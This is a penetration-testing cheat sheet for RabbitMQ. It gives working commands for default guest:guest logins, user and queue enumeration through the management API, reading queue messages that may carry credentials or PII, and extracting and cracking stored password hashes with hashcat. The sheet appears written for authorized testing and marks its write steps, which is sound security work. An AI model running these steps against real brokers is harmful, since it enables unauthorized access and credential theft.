---
service: rabbitmq
title: RabbitMQ
ports: 5672, 5671, 15672, 25672
aliases: amqp, rabbit
---

# RabbitMQ — quick wins

**When you see it:** 5672/tcp open (AMQP) and/or 15672/tcp open (management HTTP) — try
`guest:guest` against the management UI immediately. The `guest` account is localhost-only
by default but Docker images, IoT firmware, and misconfigured deployments routinely disable
that restriction.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off before publishing messages or modifying broker topology.

## Triage (read-only)
```sh
nmap -sV --script amqp-info -p 5672 H        # version, mechanisms, capabilities
curl -s http://H:15672                        # management UI present?
curl -s -u guest:guest http://H:15672/api/overview   # auth check + broker info
curl -s -u guest:guest http://H:15672/api/nodes      # cluster nodes, memory, disk
curl -s -u guest:guest http://H:15672/api/users      # all user accounts
```

## Quick wins

### Authenticate and enumerate via management API
```sh
# overview: version, queues, connections, consumers
curl -s -u USER:PASS http://H:15672/api/overview | python3 -m json.tool

# list all virtual hosts
curl -s -u USER:PASS http://H:15672/api/vhosts

# list all queues with message counts
curl -s -u USER:PASS "http://H:15672/api/queues" | \
  python3 -c "import sys,json; [print(q['vhost'],q['name'],q['messages']) for q in json.load(sys.stdin)]"
```
*Why:* the management REST API exposes the full broker topology (vhosts, exchanges, queues,
bindings, consumers) with a single authenticated HTTP call.

### Read messages from a queue ✏️
```sh
# peek up to 10 messages (requeues them if ackmode is ack_requeue_true)
curl -s -u USER:PASS \
  "http://H:15672/api/queues/%2F/QUEUENAME/get" \
  -X POST -H 'Content-Type: application/json' \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}'
```
*Why:* queues often contain inter-service API calls, job payloads, credentials passed
between microservices, or PII. `ack_requeue_true` reads without consuming messages
(non-destructive in most scenarios, but does briefly dequeue them).

### Crack stored password hashes
```sh
# RabbitMQ hashes: SHA-256 or SHA-512 of (4-byte salt || password), base64-encoded
# extract from /api/users response, then:
echo '<BASE64_HASH>' | base64 -d | xxd -pr -c128 | \
  perl -pe 's/^(.{8})(.*)/$2:$1/' > rabbit.hash
hashcat -m 1420 --hex-salt rabbit.hash /usr/share/wordlists/rockyou.txt
```
*Why:* cracking the hash yields the password for use on AMQP, management UI, or any
reused credential on the host.

### AMQP protocol probe (no management plugin)
```sh
python3 - <<'EOF'
import amqp
conn = amqp.connection.Connection(host="H", port=5672, userid="guest", password="guest", virtual_host="/")
conn.connect()
print("mechanisms:", conn.mechanisms)
for k,v in conn.server_properties.items():
    print(k, v)
conn.close()
EOF
```
*Why:* when the management plugin (15672) is absent, the AMQP protocol itself leaks version
and capability metadata on successful authentication.

## aranum helpers
- `enum-rabbitmq.sh` — the dispatcher that produced the finding (port scan, management API
  auth check, queue list).

## Gotchas
- `guest:guest` is restricted to `127.0.0.1` by the `loopback_users` config key;
  remote exposure almost always means a custom image or explicit `loopback_users = none`.
  Always test remotely before assuming it is blocked.
- The management plugin must be enabled (`rabbitmq-plugins enable rabbitmq_management`);
  15672 will be absent if it is not loaded.
- Port 25672 is the Erlang distribution / clustering port — if the Erlang cookie is
  guessable (default `rabbit` or leaked from `/proc`), you can join the cluster as a node
  (separate Erlang cookie RCE technique, out of scope here).
- AMQP 1.0 (RabbitMQ 4.x) may share port 5672 with AMQP 0-9-1; use a 1.0-capable client
  if 0-9-1 connections are refused.
- Quick wins here are genuinely thin without management API access — if 15672 is absent and
  5672 requires non-default creds, move to brute-force before investing further.

## Sources
- HackTricks `5671-5672-pentesting-amqp` and `15672-pentesting-rabbitmq-management`
  (hacktricks.wiki); Hackviser RabbitMQ; RabbitMQ official docs (access control,
  loopback_users).
